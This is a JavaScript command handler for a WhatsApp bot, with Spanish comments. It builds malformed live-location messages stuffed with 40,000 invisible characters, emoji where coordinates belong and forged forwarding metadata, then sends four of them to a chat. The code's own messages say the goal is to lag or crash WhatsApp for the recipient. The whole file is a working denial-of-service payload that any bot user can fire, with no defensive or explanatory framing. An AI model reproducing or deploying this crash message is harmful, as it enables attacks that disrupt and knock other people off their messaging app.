const buildLagMessage = () => ({
  viewOnceMessage: {
    message: {
      liveLocationMessage: {
        degreesLatitude: '💣',
        degreesLongitude: '💥',
        caption: '\u2063'.repeat(40000) + '💥'.repeat(1000), // aún más largo
        sequenceNumber: '999999',
        jpegThumbnail: Buffer.alloc(1 * 1024, 0), // miniatura ligera
        contextInfo: {
          forwardingScore: 99999,
          isForwarded: true,
          externalAdReply: {
            title: '💣 Lag Extremo',
            body: 'Lag que puede botarte de WhatsApp',
            mediaType: 1,
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: 'https://wa.me/0'
          }
        }
      }
    }
  }
})

let handler = async (m, { conn }) => {
  const jid = m.chat
  const times = 4 // más envíos = más lag

  await m.reply(`⚠️ Enviando ${times} bombas extremas...\nEsto puede botar WhatsApp.`)

  for (let i = 0; i < times; i++) {
    try {
      await conn.relayMessage(jid, buildLagMessage(), { messageId: conn.generateMessageTag() })
      await new Promise(resolve => setTimeout(resolve, 150))
    } catch (error) {
      console.error('Error al enviar:', error)
      await m.reply('❗ Error al enviar mensaje.')
      return
    }
  }

  await m.reply('✅ *Huevo enviado.*')
}

handler.command = /^lagchat$/i
handler.owner = false

export default handler